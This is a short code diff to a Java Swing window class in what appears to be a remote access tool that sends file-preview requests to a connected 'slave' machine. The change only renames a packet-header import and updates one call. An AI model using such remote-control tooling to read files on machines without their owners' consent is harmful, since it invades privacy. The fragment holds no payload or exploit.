@@ -20,8 +20,8 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Slave;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
 
 
 @SuppressWarnings("serial")
@@ -64,7 +64,7 @@ public class FramePreviewFile extends BaseFrame {
 		btnReadMore.setIcon(new ImageIcon(FramePreviewFile.class.getResource("/icons/transfer.png")));
 		btnReadMore.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
-				PacketBuilder pb = new PacketBuilder(Header.PREVIEW_FILE, new Object[] { file, line++ });
+				PacketBuilder pb = new PacketBuilder(OutgoingHeader.PREVIEW_FILE, new Object[] { file, line++ });
 				sl.addToSendQueue(pb);
 			}
 		});
